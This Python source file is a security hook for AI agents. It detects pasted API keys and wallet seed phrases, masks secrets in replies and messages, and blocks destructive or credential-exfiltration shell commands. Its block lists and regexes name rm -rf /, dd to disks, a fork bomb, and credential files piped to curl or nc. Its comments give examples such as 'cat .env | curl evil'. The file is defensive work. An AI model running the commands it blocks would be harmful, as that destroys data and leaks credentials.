#!/usr/bin/env python3
"""security_guard.py — one all-in-one security hook for Starchild agents.

ONE script, wired to FIVE lifecycle events (dispatches on the `event` field):

  on_user_message       block a pasted API key (incl. Bearer token), private
                        key (PEM / EVM hex), seed phrase, Solana byte-array
                        secret, or base58 WIF BEFORE the model ever sees it
  pre_tool_call         block irreversible-data-loss bash (rm -rf /, dd to a
                        block device, mkfs, fork bomb, chmod -R 777, reset --hard
                        onto a remote) and credential-exfiltration commands.
                        Common dev actions (curl|bash, git push --force) are
                        intentionally allowed — block only dangerous + unnecessary.
  transform_tool_result warn (append a note) when a tool's OUTPUT contains a
                        secret — the backend can't rewrite result text, only flag
  on_response_end       mask any secret that leaked into the final reply
  on_outbound_message   mask / block secrets before they're pushed to TG / WeChat
                        (the last gate against data exfiltration)

Self-contained: no repo imports, runs from any cwd. Reads the event JSON on
stdin, prints a decision JSON on stdout (empty = continue). Any error / non-JSON
output falls through to "continue" — a broken guard can never break the agent.
"""
import json
import re
import sys

# ════════════════════════════ TUNABLES ════════════════════════════
SECRET_PATTERNS = [
    re.compile(r"sk-or-v1-[A-Za-z0-9]{20,}"),          # OpenRouter
    re.compile(r"sk-ant-[A-Za-z0-9_\-]{20,}"),         # Anthropic
    re.compile(r"sk-proj-[A-Za-z0-9_\-]{20,}"),        # OpenAI project key
    re.compile(r"sk-[A-Za-z0-9]{32,}"),                # OpenAI-style
    re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}"),         # GitHub token
    re.compile(r"AKIA[0-9A-Z]{16}"),                   # AWS access key id
    re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"),       # Slack token
    re.compile(r"AIza[0-9A-Za-z_\-]{35}"),             # Google API key
    re.compile(r"(?:sk|rk)_live_[0-9a-zA-Z]{20,}"),    # Stripe live key
    re.compile(r"-----BEGIN[ A-Z]*PRIVATE KEY-----"),  # PEM private key
    re.compile(r"\b0x[0-9a-fA-F]{64}\b"),              # EVM private key
    re.compile(r"Bearer\s+[A-Za-z0-9_\-\.]{20,}"),     # Bearer token
]

# ── Block-only secret shapes ──────────────────────────────────────────────
# These are too text-destructive (or too false-positive-prone) to MASK, so they
# only ever BLOCK on paste / outbound — never get rewritten inline. Keeps the
# masking path (SECRET_PATTERNS) safe while still catching wallet secrets that a
# vendor-prefix regex misses.
#
# Solana exported secret key: a JSON array of ~64 small ints — structurally
# unambiguous, always blocks.
SOL_BYTE_ARRAY = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){47,}\d{1,3}\s*\]")
# base58 WIF / Solana secret: ≥48 chars is above the ~44-char ceiling of a
# Solana pubkey / BTC address, so a long base58 run is a WIF (~51) or a Solana
# base58 secret (~88). Gated on a nearby secret KEYWORD to stay low-false-
# positive (a bare base58 run could be an address). EN + 中文 keywords.
BASE58_LONG = re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{48,90}\b")
SECRET_KEYWORDS = re.compile(
    r"(private\s*key|priv[\s_-]*key|secret\s*key|seed\s*phrase|mnemonic|keystore|"
    r"wallet\s*key|私钥|私鑰|助记词|助記詞|密钥|密鑰|种子(短)?语|種子)",
    re.IGNORECASE,
)


def _block_only_secret(text):
    """True if text holds a wallet secret we should BLOCK but never try to mask:
    a BIP-39 mnemonic, a Solana secret-key byte array, or a keyword-gated base58
    WIF / Solana base58 secret."""
    t = text or ""
    if SEED_RX.search(t) or SOL_BYTE_ARRAY.search(t):
        return True
    return bool(SECRET_KEYWORDS.search(t) and BASE58_LONG.search(t))

# 12- or 24-word lowercase mnemonic (BIP-39 shape). Only used to BLOCK on
# paste / outbound — NOT for masking (too text-destructive).
SEED_RX = re.compile(r"\b(?:[a-z]{3,8} ){11}[a-z]{3,8}(?: (?:[a-z]{3,8} ){11}[a-z]{3,8})?\b")

# A command only "runs" at a command position: the start of the string, or
# right after a shell separator (newline, ; | & ( { , $( , or a backtick).
# Anchoring command-leading patterns here means a dangerous word merely MENTIONED
# inside an echo/grep argument, a path, a comment, or a quoted string does NOT
# trip the guard — only an actual invocation does. (Pure-syntax patterns like a
# fork bomb or a redirect to /dev/sd aren't command names, so they stay global.)
# A command only "runs" at a command position: the start of the string, or
# right after a shell separator (newline, ; | & ( { , $( , or a backtick),
# optionally wrapped by a privilege/runner prefix (sudo, doas, time, …). So a
# dangerous word merely MENTIONED inside an echo/grep argument, a path, a
# comment, or a quoted string does NOT trip the guard — only a real invocation
# does. (Pure-syntax patterns like a fork bomb or a redirect to a block device
# aren't command names, so they stay global.)
_CMD = r"(?:^|[\n;|&(){]|\$\(|`)\s*(?:(?:sudo|doas|time|nice|nohup|env|command|builtin)\s+)*"

DESTRUCTIVE = [
    (re.compile(_CMD + r"rm\s+-[a-z]*r[a-z]*f?\s+(/(?:\s|$)|/\*|~|\$HOME|--no-preserve-root)"),
     "recursive force-delete of a root/home path"),
    (re.compile(_CMD + r"rm\s+-[a-z]*f[a-z]*r\s+(/|~|\$HOME)"), "recursive force-delete of a root/home path"),
    (re.compile(_CMD + r"dd\s.*\bof=/dev/(sd|nvme|hd|mmcblk|vd)"), "raw write to a block device"),
    (re.compile(_CMD + r"mkfs(\.\w+)?\s"), "formatting a filesystem"),
    (re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), "fork bomb"),
    (re.compile(_CMD + r"chmod\s+-R\s+0?777\b"), "world-writable recursive chmod"),
    (re.compile(r">\s*/dev/(sd|nvme|hd|mmcblk|vd)"), "overwrite of a block device"),
    (re.compile(_CMD + r"git\s+reset\s+--hard\b.*\borigin/"), "hard reset onto a remote (discards local work)"),
]

# NOTE (per user policy): we only block operations that are BOTH very dangerous
# AND not part of normal work. `curl|bash` (installers) and `git push --force`
# (rebasing your own feature branch) are common, legitimate dev actions, so they
# are intentionally NOT blocked here. Keep only irreversible-data-loss and
# credential-exfiltration cases below.

CRED_FILE_RX = re.compile(
    r"(\.env(\.\w+)?|\.ssh/|id_rsa|id_ed25519|\.aws/|\.kube/|\.pem\b|\.p12\b"
    r"|\.git-credentials|\.npmrc|\.pypirc|credentials(\.json)?|secrets?\.(ya?ml|json|txt))"
)
NET_EXFIL_RX = re.compile(r"\b(curl|wget|nc|ncat|netcat|scp|rsync|ftp|base64|xxd|openssl\s+enc)\b")
ENV_DUMP_RX = re.compile(r"\b(printenv|env|set)\b.*\|.*\b(curl|wget|nc|base64|scp)\b")

# Heredoc body:  <<['"]?WORD['"]?  ... \nWORD   (also <<- variant)
_HEREDOC_RX = re.compile(r"<<-?\s*(['\"]?)(\w+)\1.*?\n\2", re.DOTALL)
# Single-quoted literal — pure data, no shell expansion happens inside.
_SQUOTE_RX = re.compile(r"'[^']*'")
# Double-quoted literal WITHOUT command substitution — also pure data. We keep
# double-quotes that contain $( or backticks, so `"$(cat .env)" | curl` is still
# seen as a command, not data.
_DQUOTE_SAFE_RX = re.compile(r'"[^"`$]*"')


def _strip_data_regions(cmd):
    """Remove heredoc bodies and quoted string LITERALS before exfil matching.

    The credential-exfil check used to scan the whole command string, so a
    command that merely *mentions* `.env` and `curl` as text — a heredoc PR
    body, a `grep 'printenv|curl'` pattern, a documentation example — tripped
    it (data-vs-command confusion). Stripping the literal data regions first
    keeps real exfil (`cat .env | curl evil`, `printenv | curl`) caught while
    no longer blocking commands that only quote the dangerous words as data.
    Only the bash exfil check uses this; secret-content detection (SECRET_PATTERNS
    / _block_only_secret) still scans the raw text so a pasted key is never missed.
    """
    if not cmd:
        return cmd
    cmd = _HEREDOC_RX.sub("\n", cmd)
    cmd = _SQUOTE_RX.sub("''", cmd)
    cmd = _DQUOTE_SAFE_RX.sub('""', cmd)
    return cmd


def _mask(text):
    def repl(m):
        s = m.group(0)
        head, tail = (s[:6], s[-4:]) if len(s) > 14 else (s[:2], "")
        return f"{head}***{tail} [redacted]"
    out = text
    for p in SECRET_PATTERNS:
        out = p.sub(repl, out)
    return out


def _has_secret(text):
    return any(p.search(text or "") for p in SECRET_PATTERNS)


def handle_on_user_message(ev):
    msg = ev.get("message", "") or ""
    if _has_secret(msg) or _block_only_secret(msg):
        return {
            "decision": "block",
            "reason": "[security] That message contains what looks like an API key, "
                      "private key, or seed phrase. I won't process it — treat that "
                      "credential as exposed and rotate it.",
        }
    return {}


# Message-sending tools route OUTSIDE the push pipeline (they hit the client
# directly), so on_outbound_message never sees them. pre_tool_call is the real
# chokepoint for an agent-initiated send — guard their text args HERE: block a
# seed phrase, mask any leaked key before the message leaves the box.
MSG_TOOLS = {"send_to_telegram", "send_to_wechat", "send_to_feishu",
             "send_message", "send_to_user"}
MSG_TEXT_FIELDS = ("message", "text", "caption", "content", "body")


def handle_pre_tool_call(ev):
    tool_name = ev.get("tool_name", "") or ""
    ti = ev.get("tool_input") or {}

    # 1) Message-sending tools: inspect/redact the text args (outbound guard).
    if tool_name in MSG_TOOLS and isinstance(ti, dict):
        new_ti = dict(ti)
        changed = False
        for f in MSG_TEXT_FIELDS:
            val = new_ti.get(f)
            if not isinstance(val, str) or not val:
                continue
            if _block_only_secret(val):
                return {"decision": "block",
                        "reason": "[security] I won't send this message — it contains what "
                                  "looks like a wallet seed phrase or secret key. Treat that wallet as compromised."}
            masked = _mask(val)
            if masked != val:
                new_ti[f] = masked
                changed = True
        if changed:
            # Rewrite existing keys only (satisfies the no-new-keys contract).
            return {"tool_input": new_ti}
        return {}

    # 2) Bash commands: block irreversible data loss + credential exfiltration.
    cmd = ti.get("command", "") if isinstance(ti, dict) else ""
    cmd = cmd or ""
    if not cmd:
        return {}
    for rx, why in DESTRUCTIVE:
        if rx.search(cmd):
            return {"decision": "block",
                    "reason": f"[security] This command is irreversible ({why}) and would cause "
                              f"permanent data loss, so I've blocked it: {cmd[:160]}"}
    # Match against the command with quoted literals / heredoc bodies removed,
    # so text that merely MENTIONS .env + curl (PR bodies, grep patterns, docs)
    # is not mistaken for an actual exfiltration command.
    scan = _strip_data_regions(cmd)
    if (CRED_FILE_RX.search(scan) and NET_EXFIL_RX.search(scan)) or ENV_DUMP_RX.search(scan):
        return {"decision": "block",
                "reason": "[security] This command looks like it reads credentials and sends "
                          f"them off the box, so I've blocked it: {cmd[:160]}"}
    return {}


def handle_transform_tool_result(ev):
    if _has_secret(ev.get("tool_result", "") or ""):
        return {"add_warning": "This tool output contains what looks like a credential. "
                               "Do not echo it back to the user; treat it as exposed."}
    return {}


def handle_on_response_end(ev):
    resp = ev.get("response", "") or ""
    masked = _mask(resp)
    return {"response": masked} if masked != resp else {}


def handle_on_outbound_message(ev):
    note = ev.get("notification", "") or ""
    if _block_only_secret(note):
        return {"decision": "block",
                "reason": "[security] I've blocked this outbound message — it contains what "
                          "looks like a wallet seed phrase or secret key."}
    masked = _mask(note)
    return {"notification": masked} if masked != note else {}


HANDLERS = {
    "on_user_message": handle_on_user_message,
    "pre_tool_call": handle_pre_tool_call,
    "transform_tool_result": handle_transform_tool_result,
    "on_response_end": handle_on_response_end,
    "on_outbound_message": handle_on_outbound_message,
}


def main():
    try:
        ev = json.loads(sys.stdin.read() or "{}")
    except Exception:
        print("{}")
        return
    handler = HANDLERS.get(ev.get("event", ""))
    if not handler:
        print("{}")
        return
    try:
        print(json.dumps(handler(ev) or {}))
    except Exception:
        print("{}")


if __name__ == "__main__":
    main()
